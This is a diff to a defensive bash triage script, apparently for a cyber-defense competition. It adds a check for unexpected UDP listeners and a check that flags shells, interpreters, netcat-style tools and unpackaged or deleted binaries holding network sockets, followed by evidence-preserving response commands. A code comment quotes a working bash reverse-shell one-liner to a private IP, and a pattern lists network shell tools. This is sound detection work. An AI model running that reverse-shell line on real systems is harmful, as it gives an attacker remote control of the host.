@@ -642,6 +642,302 @@ else
   clean "port check skipped (need ss + CCDC_ALLOWED_TCP_PORTS)"
 fi
 
+# --- 9-ii. Listening UDP ports ------------------------------------------------
+# UDP gets its own check because the TCP one cannot see it at all, and a UDP
+# listener is a normal way to hold a foothold that survives a TCP-only firewall
+# review.
+#
+# CCDC_ALLOWED_UDP_PORTS is empty on most boxes - the packet usually scores TCP
+# services - so an allow-list-only test would flag stock Ubuntu's DHCP client and
+# mDNS responder on every single pass. A check that is wrong on a clean box is a
+# check you stop reading, so the stock set below is allowed implicitly. It is
+# deliberately short: these are the ports a default install binds, not a blanket
+# "common services" list, because the whole value of this check is that an
+# unexplained UDP port stands out.
+#
+# The ephemeral range is excluded for the same reason, and it is read from the
+# kernel rather than guessed. Every outbound UDP client - the resolver, NTP,
+# anything that has ever sent a packet - holds an unconnected socket on a random
+# high port, and those ports are DIFFERENT on every pass. Reported, they are a
+# permanent block of findings that never repeats and never means anything.
+#
+# That is a real hole and it is covered deliberately somewhere else: check 9-iii
+# below looks at every listening socket by OWNER, so a payload that binds UDP
+# 45000 is caught there by what is holding it, not by its port number.
+begin
+stock_udp='68 546 123 323 5353 631 111 67'
+ephemeral_low=32768
+ephemeral_high=60999
+if [ -r /proc/sys/net/ipv4/ip_local_port_range ]; then
+  read -r __eph_low __eph_high </proc/sys/net/ipv4/ip_local_port_range 2>/dev/null || true
+  case "${__eph_low:-}${__eph_high:-}" in
+    ''|*[!0-9]*) : ;;
+    *) ephemeral_low=$__eph_low; ephemeral_high=$__eph_high ;;
+  esac
+fi
+if ccdc_have ss; then
+  unexpected_udp=''
+  while IFS= read -r port; do
+    [ -n "$port" ] || continue
+    ccdc_list_contains "$port" "${CCDC_ALLOWED_UDP_PORTS:-}" && continue
+    ccdc_list_contains "$port" "$stock_udp" && continue
+    [ "$port" -ge "$ephemeral_low" ] 2>/dev/null && [ "$port" -le "$ephemeral_high" ] 2>/dev/null && continue
+    unexpected_udp="$unexpected_udp $port"
+  done <<EOF
+$(ss -ulnH 2>/dev/null | awk '$4 !~ /^(127\.|\[::1\]|::1)/ {print $4}' | sed 's/.*://' | sort -un)
+EOF
+  if [ -n "$unexpected_udp" ]; then
+    amber "listening UDP port(s) not accounted for:$unexpected_udp   [CARD 8]"
+    for p in $unexpected_udp; do emit AMBER udpport "$p" "listening UDP port not in the allow list"; done
+    detail "UDP does not appear in a TCP port review and is easy to forget"
+    for p in $unexpected_udp; do
+      detail "$(ss -ulnpH "sport = :$p" 2>/dev/null | head -1 | cut -c1-100)"
+    done
+  else
+    clean "no unexpected listening UDP ports"
+  fi
+else
+  clean "UDP port check skipped (need ss)"
+fi
+
+# --- 9-iii. What is HOLDING the network sockets -------------------------------
+# Every check above this line reads something at rest: a file, an account, a
+# unit. All of them are blind to the payload that never touched the disk -
+#
+#     bash -i >& /dev/tcp/10.0.0.5/443 0>&1
+#
+# - because there is no file to find, the port is one the firewall must allow,
+# and the connection is outbound so no listener appears anywhere. The only place
+# it is visible is the socket table, and the finding is not the port. It is WHO
+# IS HOLDING IT.
+#
+# So this does not ask "is this port allowed". It asks whether the process on
+# the end of a socket has any business being on the end of a socket. A shell or
+# an interpreter holding a connection to the outside is the single highest-
+# confidence signal in this file: nothing about administering a web server
+# leaves bash attached to a foreign address.
+#
+# Three separate tells, in descending confidence:
+#   1. the owner is a shell/interpreter/netcat        (reverse or bind shell)
+#   2. the owner's executable was deleted or lives in /tmp   (dropped payload)
+#   3. the owner's executable belongs to no package   (AMBER: compiled implant,
+#      but also every from-source install, so it is a prompt and not a verdict)
+#
+# Root sees every socket's owner. A normal user sees only their own, which is
+# partial and still worth having - the first triage of an event is usually run
+# before anyone has thought about sudo, and a payload running as the account you
+# are logged in on is exactly the case that is visible. What must never happen is
+# a partial pass printing the word "clean" as if it were a whole one, so the
+# result line below says which of the two runs you just did.
+begin
+if ! ccdc_have ss; then
+  clean "socket owner check skipped (need ss)"
+else
+  socket_scope='every process'
+  [ "$(id -u)" -eq 0 ] || socket_scope="only $(id -un)'s own processes - RE-RUN WITH SUDO for the rest"
+  # Ports this box listens on. A TCP session whose LOCAL port is one of these is
+  # someone connecting IN; anything else is this box reaching OUT. Getting that
+  # backwards would report every visitor to a scored web server as an outbound
+  # C2 channel, so it is computed from the live listen table rather than assumed.
+  listen_ports=$(ss -tlnH 2>/dev/null | awk '{print $4}' | sed 's/.*://' | sort -un | tr '\n' ' ')
+
+  # Cache the package lookup per executable: a busy box has hundreds of sockets
+  # and a handful of distinct binaries behind them.
+  pkg_cache_paths=''
+  pkg_cache_states=''
+  pkg_owned() {
+    local exe=$1 i=0 p state
+    for p in $pkg_cache_paths; do
+      i=$((i + 1))
+      if [ "$p" = "$exe" ]; then
+        state=$(printf '%s' "$pkg_cache_states" | cut -d' ' -f"$i")
+        [ "$state" = yes ]
+        return
+      fi
+    done
+    state=unknown
+    if ccdc_have dpkg-query; then
+      dpkg-query -S "$exe" >/dev/null 2>&1 && state=yes || state=no
+    elif ccdc_have rpm; then
+      rpm -qf "$exe" >/dev/null 2>&1 && state=yes || state=no
+    fi
+    # Only cache path-shaped keys; a path with whitespace would corrupt the
+    # parallel word lists, so such an executable simply is not cached.
+    case "$exe" in
+      *[![:space:]]*[[:space:]]*) : ;;
+      *) pkg_cache_paths="$pkg_cache_paths $exe"; pkg_cache_states="$pkg_cache_states $state" ;;
+    esac
+    [ "$state" = yes ]
+  }
+
+  # Why this process holding this socket is not normal - or nothing, if it is.
+  # Prints the reason and returns 0; returns 1 for an ordinary daemon.
+  socket_owner_reason() {
+    local exe=$1 base
+    case "$exe" in
+      *' (deleted)') printf 'its executable was deleted from disk'; return 0 ;;
+      /tmp/*|/var/tmp/*|/dev/shm/*) printf 'its executable lives in a world-writable directory'; return 0 ;;
+    esac
+    base=${exe##*/}
+    case "$base" in
+      sh|bash|dash|zsh|ksh|busybox|python|python[0-9.]*|perl|ruby|php|lua|lua[0-9.]*|\
+      tclsh|expect|nc|nc.openbsd|nc.traditional|ncat|netcat|socat|telnet|awk|gawk|mawk)
+        printf 'it is %s - an interpreter, not a service' "$base"; return 0 ;;
+    esac
+    return 1
+  }
+
+  # Buffer the three groups instead of printing as the loop finds them. A busy
+  # box interleaves them - RED, then an AMBER, then another RED - and the
+  # remediation block for one finding then sits underneath a different finding's
+  # heading. On a screen you are reading in a hurry that is not a cosmetic
+  # problem: the "run this" commands under a heading have to belong to it.
+  #
+  # detail() and fix() write fixed indents, so the buffers reproduce them rather
+  # than reformatting: the printed output is identical, only the order changes.
+  D='         '
+  F='           '
+  FIXHDR="${D}---- run this ----------------------------------------"
+  net_red_buf=''
+  net_amber_buf=''
+  net_unpkg_buf=''
+  seen_sockets=''
+  seen_unpackaged=''
+  while read -r netid state _ _ local_addr peer rest; do
+    [ -n "${rest:-}" ] || continue
+    case "$state" in ESTAB|LISTEN|UNCONN) ;; *) continue ;; esac
+    # A socket that only ever talks to this machine is not an exfil path and not
+    # reachable from a scan. Excluding it is the same call the TCP port check
+    # above documents, for the same reason.
+    case "$local_addr" in 127.*|'[::1]'*|::1*) continue ;; esac
+    case "$peer" in 127.*|'[::1]'*|::1*) continue ;; esac
+    [ "$netid" = udp ] && [ "$state" = ESTAB ] && case "$peer" in *:67|*:68) continue ;; esac
+
+    pid=$(printf '%s' "$rest" | grep -oE 'pid=[0-9]+' | head -1 | cut -d= -f2)
+    case "$pid" in ''|*[!0-9]*) continue ;; esac
+    [ "$pid" = "$$" ] && continue
+
+    exe=$(readlink "/proc/$pid/exe" 2>/dev/null) || exe=''
+    [ -n "$exe" ] || continue
+    # Our own tooling legitimately runs interpreters, and the guardian chain
+    # holds sockets when it probes a scored service. An unclearable RED teaches
+    # you to ignore RED.
+    own_payload "${exe% (deleted)}" && continue
+
+    local_port=${local_addr##*:}
+    peer_port=${peer##*:}
+    direction=outbound
+    if [ "$state" = LISTEN ] || [ "$state" = UNCONN ]; then
+      direction=listening
+    elif ccdc_list_contains "$local_port" "$listen_ports"; then
+      direction=inbound
+    fi
+
+    if reason=$(socket_owner_reason "$exe"); then
+      # A python or node web service legitimately listens and legitimately
+      # serves inbound sessions. What is never ordinary is that same interpreter
+      # reaching OUT, or holding a port nobody put in the packet.
+      severity=RED
+      if [ "$direction" != outbound ] \
+        && ccdc_list_contains "$local_port" "${CCDC_ALLOWED_TCP_PORTS:-} ${CCDC_ALLOWED_UDP_PORTS:-}"; then
+        severity=AMBER
+      fi
+      key="$exe|$direction|$peer"
+      case " $seen_sockets " in *" $key "*) continue ;; esac
+      seen_sockets="$seen_sockets $key"
+
+      if [ "$severity" = RED ]; then
+        emit RED netproc "$exe" "$direction connection held by a process because $reason"
+      else
+        emit AMBER netprocsvc "$exe" "$direction socket held by a process because $reason"
+      fi
+
+      cmd=$(tr '\0' ' ' <"/proc/$pid/cmdline" 2>/dev/null | cut -c1-88)
+      started=$(ps -o lstart= -p "$pid" 2>/dev/null | sed 's/^ *//')
+      printf -v qpid '%q' "$pid"
+      printf -v qevidence '%q' "$state_dir/evidence-pid-$pid"
+      entry="${D}pid $pid  $exe"$'\n'
+      if [ "$direction" = listening ]; then
+        entry="$entry${D}  listening on $local_addr  ($reason)"$'\n'
+      else
+        entry="$entry${D}  $direction  $local_addr -> $peer  ($reason)"$'\n'
+      fi
+      [ -n "$cmd" ] && entry="$entry${D}  cmdline: $cmd"$'\n'
+      [ -n "$started" ] && entry="$entry${D}  started: $started"$'\n'
+      entry="$entry$FIXHDR"$'\n'
+      entry="$entry${F}sudo kill -STOP $qpid                      # FREEZE it first - do not kill yet"$'\n'
+      entry="$entry${F}sudo mkdir -p -- $qevidence"$'\n'
+      entry="$entry${F}sudo cp -- /proc/$qpid/exe $qevidence/exe 2>/dev/null; sudo ls -l /proc/$qpid/exe"$'\n'
+      entry="$entry${F}sudo tr '\\0' ' ' < /proc/$qpid/cmdline; echo"$'\n'
+      entry="$entry${F}sudo ls -l /proc/$qpid/cwd /proc/$qpid/fd"$'\n'
+      entry="$entry${F}ps -o pid,ppid,user,lstart,cmd -p $qpid \$(ps -o ppid= -p $qpid)   # WHO STARTED IT"$'\n'
+      entry="$entry${F}sudo kill -9 $qpid"$'\n'
+      if [ "$severity" = RED ]; then
+        net_red_buf="$net_red_buf$entry"
+      else
+        net_amber_buf="$net_amber_buf$entry"
+      fi
+      continue
+    fi
+
+    # Tell 3. A binary that no package owns, on the network. This is the one
+    # that catches a compiled implant - it is not an interpreter, it is not
+    # deleted, and it sits in a respectable-looking directory - and it is also
+    # every legitimate from-source install, so it asks rather than accuses.
+    #
+    # Two shapes qualify: anything reaching OUT, and anything listening on a
+    # port the packet does not account for. The second is what covers the UDP
+    # ports check 9-ii deliberately stops looking at.
+    case "$direction" in
+      outbound) ;;
+      *)
+        ccdc_list_contains "$local_port" "${CCDC_ALLOWED_TCP_PORTS:-} ${CCDC_ALLOWED_UDP_PORTS:-} $stock_udp" \
+          && continue
+        ;;
+    esac
+    ccdc_have dpkg-query || ccdc_have rpm || continue
+    pkg_owned "$exe" && continue
+    case " $seen_unpackaged " in *" $exe "*) continue ;; esac
+    seen_unpackaged="$seen_unpackaged $exe"
+    if [ "$direction" = outbound ]; then
+      emit AMBER netunpackaged "$exe" "outbound connection from an unpackaged binary"
+      net_unpkg_buf="$net_unpkg_buf${D}$exe"$'\n'
+      net_unpkg_buf="$net_unpkg_buf${D}  pid $pid  outbound $local_addr -> $peer"$'\n'
+    else
+      emit AMBER netunpackaged "$exe" "unaccounted listening port served by an unpackaged binary"
+      net_unpkg_buf="$net_unpkg_buf${D}$exe"$'\n'
+      net_unpkg_buf="$net_unpkg_buf${D}  pid $pid  listening on $netid port $local_port"$'\n'
+    fi
+    printf -v qexe '%q' "$exe"
+    net_unpkg_buf="$net_unpkg_buf$FIXHDR"$'\n'
+    net_unpkg_buf="$net_unpkg_buf${F}ls -l -- $qexe && $(ccdc_have dpkg-query && printf 'dpkg -S' || printf 'rpm -qf') -- $qexe"$'\n'
+    net_unpkg_buf="$net_unpkg_buf${F}sha256sum -- $qexe          # then look it up off the box"$'\n'
+  done <<EOF
+$(ss -tuanpH 2>/dev/null)
+EOF
+
+  if [ -n "$net_red_buf" ]; then
+    red "process(es) on the network that should not be on the network   [CARD 12]"
+    detail "this is what a memory-only reverse shell looks like: no file, no unit, no listener"
+    printf '%s' "$net_red_buf"
+  fi
+  if [ -n "$net_amber_buf" ]; then
+    amber "interpreter(s) holding a port the packet DOES account for   [CARD 12]"
+    detail "a scored service can legitimately be a python or php app - confirm each one"
+    printf '%s' "$net_amber_buf"
+  fi
+  if [ -n "$net_unpkg_buf" ]; then
+    amber "binary(s) on the network that no package owns   [CARD 12]"
+    detail "normal for software built from source; the question is whether YOU know why it is there"
+    printf '%s' "$net_unpkg_buf"
+  fi
+  if [ -z "$net_red_buf$net_amber_buf$net_unpkg_buf" ]; then
+    clean "no shell, interpreter, or unpackaged binary holds a socket ($socket_scope)"
+  elif [ "$(id -u)" -ne 0 ]; then
+    detail "checked $socket_scope"
+  fi
+fi
+
 # --- 9b. Service accounts that have been handed a login shell -----------------
 # A system account (UID under 1000) exists to run a daemon; it has no reason to
 # have a shell. Granting one is a quiet, durable foothold that survives password
